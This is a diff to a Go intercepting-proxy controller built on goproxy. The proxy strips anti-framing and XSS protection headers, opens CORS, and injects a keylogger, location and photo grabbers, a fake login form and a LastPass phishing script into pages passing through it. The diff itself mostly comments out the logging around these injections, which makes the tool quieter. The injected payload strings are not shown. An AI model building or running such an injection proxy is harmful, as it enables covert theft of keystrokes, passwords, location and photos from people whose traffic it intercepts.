@@ -1,7 +1,7 @@
 package controllers
 
 import (
-    "log"
+    _"log"
     "bytes"
     "github.com/abourget/goproxy"
     "strings"
@@ -56,7 +56,7 @@ func utilsGetBuffer( site string ) string {
     var s string
         f, err := os.Open(fileLocation+"/"+site+".html") // Error handling elided for brevity.
         if err != nil {
-            log.Println("read error: ", err)
+            //log.Println("read error: ", err)
             // oooh recursive!
             s = utilsGetBuffer("notfound")
         } else {
@@ -70,7 +70,7 @@ func utilsGetBuffer( site string ) string {
 //function removes headers that block cross site loading
 func utilsModifyHeadersForInjection(ctx *goproxy.ProxyCtx) {
         ctx.Resp.Header.Del("X-Frame-Options")
-        ctx.Resp.Header.Add("X-Frame-Options", "*" )
+        // ctx.Resp.Header.Add("X-Frame-Options", "*" )
         ctx.Resp.Header.Del("X-Content-Type-Options")
         ctx.Resp.Header.Del("X-Xss-Protection")
         ctx.Resp.Header.Add("Access-Control-Allow-Origin", "*" )
@@ -106,7 +106,7 @@ func utilsGetHTTPHeaders( body string, contentType string ) *http.Response {
 func (w *Walker) utilsDeletefiles(path string, f os.FileInfo, err error) (e error) {
     //must check for the directory otherwise end up deleting it!
     if !f.Mode().IsDir() {
-         log.Println(path)
+         //log.Println(path)
          w.files = append(w.files, path)
     }
     //put this back in when you actually do want to clear the currently collected list
@@ -115,17 +115,17 @@ func (w *Walker) utilsDeletefiles(path string, f os.FileInfo, err error) (e erro
  }
 
 func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) string {
-            log.Println("checking injections")
+            //log.Println("checking injections")
             if globalInjectKeyLogger {
-                log.Println("INJECTING Keylogger")
+                //log.Println("INJECTING Keylogger")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             }
             if globalInjectGetLocation {
-                log.Println("INJECTING location")
+                //log.Println("INJECTING location")
                 // for _, v := range (newsSites) {
                 //     if strings.Contains(ctx.Req.URL.Host, v) { //only inject if the page is a news site
-                //         log.Println("ctx: ", ctx.Req.URL.Host, " v: ", v)
+                //         //log.Println("ctx: ", ctx.Req.URL.Host, " v: ", v)
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )        
                 //         break
@@ -133,17 +133,17 @@ func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) string {
                 // }
             }
             if globalInjectGetPhoto {
-                // log.Println("INJECTING Photo")
+                // //log.Println("INJECTING Photo")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
             }
             if globalInjectGetLogin {
-                // log.Println("INJECTING Login")
+                // //log.Println("INJECTING Login")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
             }
             if globalInjectLastpass {
-                // log.Println("INJECTING lLastpass")
+                // //log.Println("INJECTING lLastpass")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
             }
